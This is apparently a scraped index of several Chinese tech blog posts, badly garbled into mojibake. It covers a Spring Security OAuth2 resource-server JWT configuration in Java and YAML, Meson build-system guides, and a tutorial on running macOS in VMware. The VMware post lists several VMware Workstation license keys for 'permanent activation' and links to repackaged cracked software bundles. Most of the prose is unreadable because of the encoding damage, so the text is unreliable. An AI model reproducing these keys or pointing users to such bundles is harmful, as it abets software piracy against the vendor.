è½½å…¬é’¥çš„å®Œæ•´ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526 &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.75&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;xom&lt;/groupId&gt; &lt;artifactId&gt;xom&lt;/artifactId&gt; &lt;version&gt;1.3.7&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.jdom&lt;/groupId&gt; &lt;artifactId&gt;jdom&lt;/artifactId&gt; &lt;version&gt;2.0.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;net.sf.json-lib&lt;/groupId&gt; &lt;artifactId&gt;json-lib&lt;/artifactId&gt; &lt;version&gt;2.1&lt;/version&gt; &lt;classifier&gt;jdk15&lt;/classifier&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cn.hutool&lt;/groupId&gt; &lt;artifactId&gt;hutool-all&lt;/artifactId&gt; &lt;version&gt;5.5.8&lt;/version&gt;&lt;/dependency&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124import cn.hutool.core.io.FileUtil;import cn.hutool.core.util.StrUtil;import com.alibaba.fastjson.JSONObject;import net.sf.json.xml.XMLSerializer;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.beans.factory.annotation.Value;import org.springframework.boot.autoconfigure.security.oauth2.resource.OAuth2ResourceServerProperties;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.core.io.ClassPathResource;import org.springframework.core.io.Resource;import org.springframework.security.jwt.crypto.sign.RsaVerifier;import org.springframework.security.oauth2.provider.token.TokenStore;import org.springframework.security.oauth2.provider.token.store.JwtAccessTokenConverter;import org.springframework.security.oauth2.provider.token.store.JwtTokenStore;import org.springframework.web.client.RestTemplate;import java.io.BufferedReader;import java.io.InputStreamReader;import java.util.stream.Collectors;/** * OAuth2.0è®¤è¯çš„Tokené…ç½® */@Configurationpublic class OAuthTokenConfig { /** * è·å–å…¬é’¥çš„æ¥å£åœ°å€ */ @Value("${spring.security.oauth2.resourceserver.jwt.key-set-uri:}") private String keySetUri; private OAuth2ResourceServerProperties resourceServerProperties; private static final Logger logger = LoggerFactory.getLogger(OAuthTokenConfig.class); public OAuthTokenConfig(OAuth2ResourceServerProperties resourceServerProperties) { this.resourceServerProperties = resourceServerProperties; } @Bean public TokenStore tokenStore() { return new JwtTokenStore(accessTokenConverter()); } @Bean public JwtAccessTokenConverter accessTokenConverter() { JwtAccessTokenConverter converter = new JwtAccessTokenConverter(); String publicKey = getPublicKey(); converter.setVerifier(new RsaVerifier(publicKey)); logger.info("success to load public key"); return converter; } /** * é€šè¿‡è¯»å–æœ¬åœ°æ–‡ä»¶è·å–éå¯¹ç§°åŠ å¯†å…¬é’¥ * * @return å…¬é’¥ */ private String getPublicKey() { if (StrUtil.isBlank(keySetUri)) { return getKeyFromLocal(); } else { return getKeyFromAuthorizationServer(); } } /** * é€šè¿‡è®¿é—®æˆæƒæœåŠ¡å™¨è·å–éå¯¹ç§°åŠ å¯†å…¬é’¥&lt;br&gt; * è¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨OAuth2.0å†…ç½®çš„æ¥å£æ¥è·å–å…¬é’¥ï¼ŒKey Set Uri åœ°å€é…ç½®ç¤ºä¾‹ï¼š http://127.0.0.1:8080/oauth/token_key * * @return å…¬é’¥ */ private String getKeyFromAuthorizationServer() { try { XMLSerializer xmlSerializer = new XMLSerializer(); String xmlPubKey = new RestTemplate().getForObject(keySetUri, String.class); String jsonPubKey = xmlSerializer.read(xmlPubKey).toString(); JSONObject json = JSONObject.parseObject(jsonPubKey); return json.get("value").toString(); } catch (Exception e) { logger.error("failed to load public key from authorization server: {}", e.getLocalizedMessage()); } return null; } /** * è·å–æœ¬åœ°çš„å…¬é’¥ * * @return */ private String getKeyFromLocal() { Resource resource = getPublicKeyFile(); try (BufferedReader br = new BufferedReader(new InputStreamReader(resource.getInputStream()))) { return br.lines().collect(Collectors.joining("\\n")); } catch (Exception e) { logger.error("failed to load public key from local: {}", e.getLocalizedMessage()); } return null; } /** * è·å–æœ¬åœ°çš„å…¬é’¥æ–‡ä»¶ * * @return */ private Resource getPublicKeyFile() { try { // è¯»å–YMLé…ç½®é‡ŒæŒ‡å®šçš„æœ¬åœ°å…¬é’¥æ–‡ä»¶ï¼Œå¯¹åº”çš„YMLé…ç½®å¦‚ä¸‹ï¼š // spring.security.oauth2.resourceserver.jwt.public-key-location=public.crt Resource resource = resourceServerProperties.getJwt().getPublicKeyLocation(); if (FileUtil.exist(resource.getFile())) { return resource; } } catch (Exception e) { logger.error("failed to read public key file from local: {}", e.getLocalizedMessage()); } // è¯»å–é»˜è®¤è·¯å¾„ä¸‹çš„æœ¬åœ°å…¬é’¥æ–‡ä»¶ return new ClassPathResource("public.crt"); }} 123456789spring: application: name: provider-service security: oauth2: resourceserver: jwt: # public-key-location: classpath:public.crt # åŠ è½½æœ¬åœ°çš„å…¬é’¥æ–‡ä»¶ key-set-uri: http://127.0.0.1:8080/oauth/token_key # ä»è®¤è¯æˆæƒæœåŠ¡å™¨è·å–å…¬é’¥ ç‰¹åˆ«æ³¨æ„ï¼šåœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œè‹¥åœ¨ YML æ–‡ä»¶é‡Œé…ç½®äº†ä»è®¤è¯æˆæƒæœåŠ¡å™¨è·å–å…¬é’¥ï¼Œé‚£ä¹ˆå¿…é¡»ä½¿ç”¨ OAuth 2.0 å†…ç½®çš„æ¥å£ /oauth/token_key æ¥è·å–å…¬é’¥ï¼ŒåŒæ—¶ä½¿ç”¨çš„é…ç½®é¡¹æ˜¯ key-set-uriï¼Œè€Œä¸å†æ˜¯ jwk-set-uri OAuth 2.0 èµ„æºæœåŠ¡å™¨èµ„æºæœåŠ¡å™¨é‰´æƒé…ç½®é»˜è®¤æƒ…å†µä¸‹ï¼ŒOAuth 2.0 çš„æƒé™æ˜¯ä» Client çš„ scope ä¸­è·å–ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233/** * èµ„æºæœåŠ¡å™¨é…ç½® */@Configuration@EnableResourceServerpublic class OAuthResouceServer extends ResourceServerConfigurerAdapter { @Autowired private TokenStore tokenStore; /** * èµ„æºé…ç½® */ @Override public void configure(ResourceServerSecurityConfigurer resources) { resources.resourceId("school") .tokenStore(tokenStore) .stateless(true) .accessDeniedHandler(new CustomAccessDeniedHandler()); } /** * å¯¹HTTPè¯·æ±‚é‰´æƒ */ @Override public void configure(HttpSecurity http) throws Exception { http.authorizeRequests() .antMatchers("/**").access("#oauth2.hasScope(\'teacher\')") .and().csrf().disable() .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS); }} è‹¥æƒé™å­˜åœ¨äº authorities ä¸­ï¼Œéœ€è¦æ›¿ä»£ OAuth2ResourceServerWebSecurityConfiguration çš„é…ç½®ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š å¼ƒç”¨æ–¹æ³•å®‰å…¨ é€šè¿‡è‡ªå®šä¹‰ Converter æ¥æŒ‡å®šæƒé™ï¼ŒConverter æ˜¯å‡½æ•°æ¥å£ï¼Œå½“å‰ä¸Šä¸‹é—®å‚æ•°ä¸º JWT å¯¹è±¡ è·å– JWT ä¸­çš„ authorities 12345678910111213141516171819@EnableGlobalMethodSecurity(prePostEnabled = true)@EnableWebSecuritypublic class WebSecurityConfig extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.authorizeRequests() .anyRequest().authenticated() .and() .oauth2ResourceServer().jwt().jwtAuthenticationConverter(jwt -&gt; { Collection&lt;SimpleGrantedAuthority&gt; authorities = ((Collection&lt;String&gt;) jwt.getClaims() .get("authorities")).stream() .map(SimpleGrantedAuthority::new) .collect(Collectors.toSet()); return new JwtAuthenticationToken(jwt, authorities); }); }} å‚è€ƒåšå®¢ Spring Security + OAuth 2.0 ä¹‹ Resource Serverï¼ˆåŸºäº JWTï¼‰ åœ¨ Spring Boot çš„ YML é…ç½®ä¸­ä½¿ç”¨ jwt.key-uri æ›¿æ¢ jwk.key-set-uri Spring Security Oauth2 æ·»åŠ è‡ªå®šä¹‰è¿‡æ»¤å™¨å’Œ Oauth2 è®¤è¯å API æƒé™æ§åˆ¶ Spring Cloud Oauth2 - Cannot convert access token to JSON é”™è¯¯è§£å†³æ–¹æ³• var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡ å¼€å‘éšç¬” oauth"},{title:"CLion ä½¿ç”¨ Meson æ„å»º C/C++ é¡¹ç›®",url:"/posts/12d66a7e.html",text:'æç¤º æœ¬æ–‡é€‚ç”¨äº Windows/Linux ç³»ç»Ÿï¼ŒåŒ…æ‹¬ Debian/Ubuntu/CentOS/Fedora ç­‰ Linux å‘è¡Œç‰ˆã€‚ Meson å…¥é—¨æŒ‡å— Meson å…¥é—¨æŒ‡å—ä¹‹ä¸€ CLion ä½¿ç”¨ Meson æ„å»ºé¡¹ç›® CLion managing Meson projects Using meson as a build system with clion Working with meson in CLion using compilation db var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"Vmware è™šæ‹Ÿæœºå®‰è£…é»‘è‹¹æœç³»ç»Ÿ",url:"/posts/3cc999a7.html",text:'å‡†å¤‡æ“ä½œ è®¾ç½®ä¸»æ¿çš„ BIOSï¼Œå¼€å¯ç¡¬ä»¶è™šæ‹ŸåŒ–çš„æ”¯æŒ Windows ç³»ç»Ÿç¯å¢ƒä¸‹ï¼Œéœ€è¦å…³é—­è™šæ‹Ÿè½¯ä»¶ Hyper-Vï¼Œåœ¨ æ§åˆ¶é¢æ¿-ç¨‹åº-æ·»åŠ å…³é—­ Window åŠŸèƒ½ é‡Œï¼ŒæŠŠ Hyper-V å…³é—­å³å¯ è½¯ä»¶ç¯å¢ƒ è½¯ä»¶ ç‰ˆæœ¬ Vmware 15.5.6 Pro Unlocker 3.0.3 æ“ä½œç³»ç»Ÿ Windows 10 Vmware å®‰è£… Vmware å®˜ç½‘ä¸‹è½½ Vmware 15.5.6 Pro ç‰ˆæœ¬çš„å®‰è£…æ–‡ä»¶ï¼Œç„¶åç›´æ¥ç‚¹å‡» EXE æ–‡ä»¶è¿›è¡Œå®‰è£…å³å¯ï¼Œå®Œæˆå®‰è£…åå¯ä»¥è¾“å…¥ä¸‹åˆ—ç§˜é’¥è¿›è¡Œæ°¸ä¹…æ¿€æ´»ã€‚ 123456YG5H2-ANZ0H-M8ERY-TXZZZ-YKRV8UG5J2-0ME12-M89WY-NPWXX-WQH88UA5DR-2ZD4H-089FY-6YQ5T-YPRX6GA590-86Y05-4806Y-X4PEE-ZV8E0ZF582-0NW5N-H8D2P-0XZEE-Z22VAYA18K-0WY8P-H85DY-L4NZG-X7RAD Unlocker å®‰è£… ç”±äº Vmware é»˜è®¤å±è”½äº† Mac OS ç³»ç»Ÿçš„æ”¯æŒï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ Unlocker å·¥å…·è¿›è¡Œè§£é”ã€‚æœ€æ–°ç‰ˆçš„ Unlocker å¯ä»¥ä» Github ä¸Šä¸‹è½½ï¼Œç”±äºå®˜æ–¹çš„ Unlocker ä¼šåœ¨è¿è¡ŒæœŸé—´åˆ° Vmware å®˜ç½‘ä¸‹è½½ com.vmware.fusion.tools.darwin.zip.tar æ–‡ä»¶ï¼Œæ•´ä¸ªä¸‹è½½è¿‡ç¨‹éå¸¸æ…¢ã€‚å› æ­¤å»ºè®®åœ¨ Unlocker çš„ç›®å½•ä¸‹åˆ›å»º tools ç›®å½•ï¼Œç„¶åæ‰‹åŠ¨ä¸‹è½½ com.vmware.fusion.tools.darwin.zip.tar æ–‡ä»¶åˆ° tools ç›®å½•ä¸‹ï¼Œæ­¤æ—¶è¿˜éœ€è¦æ›´æ”¹ Unlocker çš„ Python ä»£ç ï¼Œå…·ä½“æ“ä½œå¯å‚è€ƒæ–‡ç« ã€‚æœ€åä½¿ç”¨ç®¡ç†å‘˜æƒé™è¿è¡Œ win-install.cmd å¯æ‰§è¡Œæ–‡ä»¶å³å¯ï¼Œè§£é”å®Œæˆå Vmware æ–°å»ºè™šæ‹Ÿæœºæ—¶å³å¯çœ‹åˆ° Apple Mac OS X çš„é€‰é¡¹ï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚ ç‰¹åˆ«æ³¨æ„ï¼šUnlocker é¡»è§£å‹åœ¨éä¸­æ–‡çš„ç›®å½•è·¯å¾„ä¸‹ï¼Œä¸åŒç‰ˆæœ¬çš„ Vmware éœ€è¦ç”¨çš„ Unlocker ç‰ˆæœ¬æ˜¯ä¸ä¸€æ ·çš„ï¼ŒVmware 15.5.6 Pro å¯¹åº” Unlocker 3.0.3 ç‰ˆæœ¬ï¼Œè§£é”æ‰€éœ€çš„èµ„æºæ–‡ä»¶å¦‚ä¸‹ï¼š Unlocker 3.0.3 ä»£ç æ›´æ”¹ç‰ˆï¼šç™¾åº¦ç½‘ç›˜ï¼Œæå–ç : hxh6 com.vmware.fusion.tools.darwin.zip.tarï¼šä¸‹è½½åœ°å€ï¼Œè‹¥ä¸‹è½½å¤±è´¥å¯ä»¥åˆ°è¿™é‡Œæ‰¾åˆ°å¯ç”¨çš„ç‰ˆæœ¬ï¼ˆ11.1.0ï¼‰ï¼Œå¹¶åœ¨ packages ç›®å½•é‡Œä¸‹è½½è¯¥æ–‡ä»¶ Vmware å®‰è£… Mac OS Vmware14 å®‰è£…é»‘è‹¹æœ mac ox x 10.13 æ‡’äººç‰ˆæ•™ç¨‹ è™šæ‹Ÿæœº Vmware å®‰è£…é»‘è‹¹æœ MacOS Sierra å›¾æ–‡æ•™ç¨‹ Vmware 15.5 è™šæ‹Ÿæœº MacOS ç³»ç»Ÿæ‰‹åŠ¨å®‰è£… Vmware Tools Vmware 11 å®‰è£… Mac OS X 10.10 åŠå®‰è£… Mac Vmware Tools é»‘è‹¹æœ Vmware å®‰è£… AppStore åŸç‰ˆ MacOS Catalina 10.15.1ï¼Œé™„ VirtualBox å®‰è£… High Sierra 10.13 æ•™ç¨‹å’Œå‡çº§åˆ° Mojave 10.14.5 å®‰è£… Vmware Tools Vmware Tools å¯ä»¥æé«˜é¼ æ ‡æ“ä½œçš„æµç•…åº¦ã€å®ç°å…¨å±æ˜¾ç¤ºã€æ–‡ä»¶å…±äº«ç­‰ï¼Œå½“åœ¨ Vmware è™šæ‹Ÿæœºä¸­å®‰è£…å¥½ Mac OS åï¼Œåœ¨ Vmware è½¯ä»¶ä¸­ç‚¹å‡»å®‰è£… Vmware Tools çš„é€‰é¡¹ï¼Œä¼šå¼¹å‡ºæç¤ºï¼šæ— æ³•åœ¨æ›´æ–°æœåŠ¡å™¨ä¸Šæ‰¾åˆ°ç»„ä»¶ã€‚è¯·è”ç³»VmwareæŠ€æœ¯æ”¯æŒæˆ–æ‚¨çš„ç³»ç»Ÿç®¡ç†å‘˜ã€‚è¿™æ˜¯å› ä¸ºåœ¨ Mac OS é‡Œå®‰è£… Vmware Tools éœ€è¦ç”¨åˆ°ä¸€ä¸ªå« darwin.iso çš„æ–‡ä»¶ï¼Œå¯ä»¥åœ¨ Vmware å®˜ç½‘ä¸‹è½½è¯¥æ–‡ä»¶ï¼Œæ‰¾åˆ°æœ€æ–°çš„ç‰ˆæœ¬å·ï¼ˆ11.1.0ï¼‰ï¼Œä¸‹è½½ packge ç›®å½•ä¸‹çš„ com.vmware.fusion.tools.darwin.zip.tar æ–‡ä»¶å³å¯ã€‚ä¸‹è½½åé€çº§æ‰“å¼€å‹ç¼©æ–‡ä»¶ï¼Œåœ¨ payload ç›®å½•ä¸­å¯ä»¥æ‰¾åˆ° darwin.iso æ–‡ä»¶ï¼Œå°†å…¶è§£å‹å¹¶æ‹·è´åˆ° Vmware çš„å®‰è£…æ ¹ç›®å½•ï¼ˆC:\\Program Files (x86)\\Vmware\\Vmware Workstationï¼‰ã€‚æœ€åå°†è™šæ‹Ÿæœºä¸­çš„ Mac OS å…³æœºï¼Œç„¶ååœ¨è™šæ‹Ÿæœºçš„è®¾ç½®ä¸­å°† CD/DVD æŒ‡å®šä¸º darwin.isoï¼Œå¯åŠ¨ Mac OS ååœ¨æ¡Œé¢å³è¾¹å°±å¯ä»¥çœ‹åˆ° Vmware Toolsï¼Œç›´æ¥åŒå‡»æ‰§è¡Œå®‰è£…æ“ä½œå³å¯ã€‚ èµ„æºä¸‹è½½ å¯ä»¥ä»ç™¾åº¦ç½‘ç›˜ä¸Šæ‰“åŒ…ä¸‹è½½ä»¥ä¸‹å·¥å…·ï¼Œæå–ç ä¸º a5qr 1234MK-Unlocker-VM15.5.zipVmware Tools linux-Win-Mac .zipVmware Workstation Pro v15.5.6 Lite.rarMacOS Mojave 10.14.5 (18F132)æ‡’äººé•œåƒ.zip è¡¥å……è¯´æ˜ ä¸å»ºè®®ä½¿ç”¨ VBox å®‰è£…é»‘è‹¹æœç³»ç»Ÿï¼Œå› ä¸º VBox å‡ºé—®é¢˜çš„æ¦‚ç‡å¾ˆå¤§ Vmware å®‰è£…é»‘è‹¹æœç³»ç»Ÿçš„æ—¶å€™ï¼Œå»ºè®®ç›´æ¥ä½¿ç”¨æ‡’äººç‰ˆçš„ cdr é•œåƒ Mac OS åŸç‰ˆ dmg é•œåƒåªèƒ½å®‰è£…åœ¨ GPT åˆ†åŒºæ ¼å¼çš„ç¡¬ç›˜ä¸Šï¼Œæ‡’äººç‰ˆ cdr é•œåƒå¯ä»¥å®‰è£…åœ¨ MBR æ ¼å¼å’Œ GPT åˆ†åŒºæ ¼å¼çš„ç¡¬ç›˜ä¸Š Vmware 15.5.6 Pro é‡Œçš„ Mac OS åœ¨æ­£å¸¸æƒ…å†µä¸‹å¯ä»¥ç›´æ¥è¯†åˆ«åˆ° IPhone è®¾å¤‡ï¼Œå¯¼èˆªåˆ° èœå•æ  - è™šæ‹Ÿæœº - å¯ç§»åŠ¨è®¾å¤‡ å°±å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæ— æ³•è¯†åˆ«ï¼Œå»ºè®®åœ¨ Windows ç³»ç»Ÿï¼ˆå®¿ä¸»æœºï¼‰ä¸Šå®‰è£…å¥½ iTunes å†è¯•è¯• var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"Meson å…¥é—¨æŒ‡å—ä¹‹ä¸€",url:"/posts/68d93948.html",text:"ç›¸å…³ç«™ç‚¹ Meson å®˜ç½‘ Meson å®˜æ–¹æ–‡æ¡£ Meson GitHub é¡¹ç›® Meson ä»‹ç»Meson çš„ç®€ä»‹Mesonï¼ˆThe Meson Build Systemï¼‰æ˜¯ä¸ªé¡¹ç›®æ„å»ºç³»ç»Ÿï¼Œç±»ä¼¼çš„æ„å»ºç³»ç»Ÿæœ‰ Makefileã€CMakeã€automake â€¦ã€‚ Meson æ˜¯ä¸€ä¸ªç”± Python å®ç°çš„å¼€æºé¡¹ç›®ï¼Œå…¶æ€æƒ³æ˜¯ï¼Œå¼€å‘äººå‘˜èŠ±è´¹åœ¨æ„å»ºè°ƒè¯•ä¸Šçš„æ¯ä¸€ç§’éƒ½æ˜¯æµªè´¹ï¼ŒåŒæ ·ç­‰å¾…æ„å»ºè¿‡ç¨‹ç›´åˆ°çœŸæ­£å¼€å§‹ç¼–è¯‘éƒ½æ˜¯ä¸å€¼å¾—çš„ã€‚å› æ­¤ï¼ŒMeson çš„è®¾è®¡ç›®çš„æ˜¯åœ¨ç”¨æˆ·å‹å¥½çš„åŒæ—¶ä¸æŸå®³æ€§èƒ½ï¼ŒMeson æä¾›å®¢æˆ·è¯­è¨€ï¼ˆcustom languageï¼‰ä½œä¸ºä¸»è¦å·¥å…·ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨å®ƒå®Œæˆé¡¹ç›®æ„å»ºçš„æè¿°ã€‚å®¢æˆ·è¯­è¨€çš„è®¾è®¡ç›®æ ‡æ˜¯ç®€å•ï¼ˆsimplicityï¼‰ã€æ¸…æ™°ï¼ˆclarityï¼‰ã€ç®€æ´ï¼ˆconcisenessï¼‰ï¼Œå…¶ä¸­å¾ˆå¤šçµæ„Ÿæ¥æºäº Python è¯­è¨€ã€‚Meson çš„å¦ä¸ªä¸€ä¸»è¦è®¾è®¡ç›®çš„æ˜¯ä¸ºç°ä»£ç¼–ç¨‹å·¥å…·æä¾›ä¼˜ç§€çš„æ”¯æŒå’Œæœ€å¥½çš„å®ç°ã€‚è¿™åŒ…æ‹¬ä¸€äº›ç‰¹æ€§å¦‚ï¼šå•å…ƒæµ‹è¯•ï¼ˆunit testingï¼‰ã€ä»£ç è¦†ç›–ç‡æŠ¥å‘Šï¼ˆcode coverage reportingï¼‰ã€å¤´æ–‡ä»¶é¢„ç¼–è¯‘ï¼ˆprecompiled headersï¼‰ã€‚ç”¨æˆ·ä¸éœ€è¦å¯»æ‰¾ç¬¬ä¸‰æ–¹å®æŒ‡ä»¤ï¼ˆthird party macrosï¼‰æˆ–ç¼–å†™ Shell è„šæœ¬æ¥å®ç°è¿™äº›ç‰¹æ€§ï¼ŒMeson å¯ä»¥å¼€ç®±å³ç”¨ã€‚Meson ç›¸æ¯” CMake æ¥è¯´ï¼Œä¸ä»…ä»…æ”¯æŒ C/C++ï¼Œè¿˜æ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€ã€‚å¦‚ä»Šï¼Œå¾ˆå¤šé¡¹ç›®éƒ½ç”± CMake è½¬å‘åˆ°äº† Mesonï¼Œä¾‹å¦‚ DPDK å’Œ Mapnikã€‚ Ninja çš„ç®€ä»‹é¡¹ç›®å¼€å‘ä¸­ä¸€èˆ¬å°† Meson å’Œ Ninja é…åˆä½¿ç”¨ï¼ŒMeson è´Ÿè´£æ„å»ºé¡¹ç›®ä¾èµ–å…³ç³»ï¼ŒNinja è´Ÿè´£ç¼–è¯‘ä»£ç ã€‚Ninja æ˜¯ä¸€ä¸ªè½»é‡çš„æ„å»ºç³»ç»Ÿï¼Œä¸»è¦å…³æ³¨æ„å»ºçš„é€Ÿåº¦ã€‚å®ƒä¸å…¶ä»–æ„å»ºç³»ç»Ÿçš„åŒºåˆ«ä¸»è¦åœ¨äºä¸¤ä¸ªæ–¹é¢ï¼šä¸€æ˜¯ Ninja è¢«è®¾è®¡æˆéœ€è¦ä¸€ä¸ªè¾“å…¥æ–‡ä»¶çš„å½¢å¼ï¼Œè¿™ä¸ªè¾“å…¥æ–‡ä»¶åˆ™ç”±é«˜çº§åˆ«çš„æ„å»ºç³»ç»Ÿç”Ÿæˆï¼›äºŒæ˜¯ Ninja è¢«è®¾è®¡æˆå°½å¯èƒ½å¿«é€Ÿæ‰§è¡Œæ„å»ºçš„å·¥å…·ã€‚ Meson çš„ç‰¹æ€§ æ”¯æŒå¤šç§å¹³å°ï¼ŒåŒ…æ‹¬ Linuxã€macOSã€Windowsã€GCCã€Clangã€Visual Studio ç­‰ æ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€ï¼ŒåŒ…æ‹¬ C/C++ã€Dã€Fortranã€Javaã€Rust æ”¯æŒåœ¨ä¸€ä¸ªéå¸¸å¯è¯»å’Œç”¨æˆ·å‹å¥½çš„éå›¾çµå®Œæ•´ DSL ä¸­æ„å»ºå®šä¹‰ æ”¯æŒå¾ˆå¤šæ“ä½œç³»ç»Ÿå’Œè£¸æœºè¿›è¡Œäº¤å‰ç¼–è¯‘ æ”¯æŒæå¿«çš„å®Œæ•´å’Œå¢é‡æ„å»ºè€Œä¼˜åŒ–ï¼Œè€Œä¸ç‰ºç‰²æ­£ç¡®æ€§ æ”¯æŒä¸å‘è¡Œç‰ˆåŒ…ä¸€èµ·å·¥ä½œçš„å†…ç½®å¤šå¹³å°ä¾èµ–æä¾›ç¨‹åº Meson çš„ä¾èµ–Meson æ˜¯ä¾èµ– Python ä¸ Ninja å®ç°çš„ï¼Œä¾èµ–çš„ç‰ˆæœ¬å¦‚ä¸‹ï¼š Python (version 3.6 or newer) Ninja (version 1.8.2 or newer) Meson å®‰è£…Windows å¹³å° aï¼‰åœ¨ Meson GitHub Releases ç½‘ç«™ä¸‹è½½ Windows ç‰ˆçš„å®‰è£…ç¨‹åºï¼Œå¦‚ meson-0.60.3-64.msi bï¼‰åŒå‡» meson-0.60.3-64.msi å®‰è£…ç¨‹åºï¼ŒæŒ‰é»˜è®¤é€‰é¡¹ç›´æ¥å®‰è£… Meson cï¼‰åœ¨ç³»ç»Ÿçš„ å¼€å§‹èœå•æ  é‡Œï¼Œæ‰¾åˆ° Visual Studio å¼€å‘äººå‘˜å·¥å…·ï¼ˆNative Tools Command Prompt for VS xxxxï¼‰ï¼ŒåŒå‡»è¿è¡Œåï¼Œåœ¨ CMD çª—å£å†…æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ Meson å’Œ Ninja çš„ç‰ˆæœ¬ 12345&gt; meson --version0.60.3&gt; ninja --version1.10.2 Debian/Ubuntu1# apt install -y meson ninja-build Fedora/CentOS12345# yum install -y meson ninja-build# æˆ–è€…# dnf install -y meson ninja-build é€šè¿‡ PyPi å®‰è£…Meson å¯ä»¥ç›´æ¥é€šè¿‡ PyPi å®‰è£…ï¼Œä½†å¿…é¡»ç¡®ä¿ä½¿ç”¨çš„æ˜¯ Python3 çš„ pipï¼Œå®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š 1# pip3 install meson ninja æˆ–è€…ä½¿ç”¨æ ‡å‡†çš„ Python å‘½ä»¤å®‰è£… Meson 12345# å®‰è£…meson# python3 -m pip install meson# å®‰è£…ninja# python3 -m pip install ninja Meson è¿è¡Œwarningè‹¥ä½¿ç”¨çš„æ˜¯ Windows å¹³å°ï¼Œåˆ™éœ€è¦åœ¨ Visual Studio å¼€å‘äººå‘˜å·¥å…·ï¼ˆNative Tools Command Prompt for VS xxxxï¼‰é‡Œæ‰§è¡Œ Meson çš„å‘½ä»¤ï¼Œè¿™æ˜¯å› ä¸º C/C++ ç¼–è¯‘å™¨åªä¼šåœ¨è¯¥å·¥å…·ä¸Šè¿è¡Œã€‚ é€šè¿‡ Mesonn åˆå§‹åŒ–æ–°çš„ C/C++ é¡¹ç›®ï¼Œå¹¶ä½¿ç”¨ Meson æ„å»ºé¡¹ç›® 1234567891011# åˆ›å»ºä¸€ä¸ªæ–°ç›®å½•æ¥ä¿å­˜é¡¹ç›®æ–‡ä»¶$ mkdir meson_project# è¿›å…¥é¡¹ç›®ç›®å½•$ cd meson_project# ä½¿ç”¨Mesonåˆå§‹åŒ–å¹¶æ„å»ºä¸€ä¸ªæ–°çš„C/C++é¡¹ç›®ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆ\"meson.build\"é…ç½®æ–‡ä»¶å’ŒC/C++æºæ–‡ä»¶$ meson init --name meson_project --build# é¡¹ç›®æ„å»ºå®Œæˆåï¼Œé»˜è®¤çš„æ„å»ºç›®å½•æ˜¯buildï¼Œå¯ä»¥ç›´æ¥è¿è¡Œæ„å»ºç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶$ build/meson_project å½“é¡¹ç›®ä»£ç å‘ç”Ÿå˜æ›´åï¼Œå¯ä»¥è¿›å…¥ build ç›®å½•é‡æ–°æ„å»ºä»£ç  12345# è¿›å…¥buildç›®å½•$ cd build# é‡æ–°æ„å»ºä»£ç $ meson compile Meson 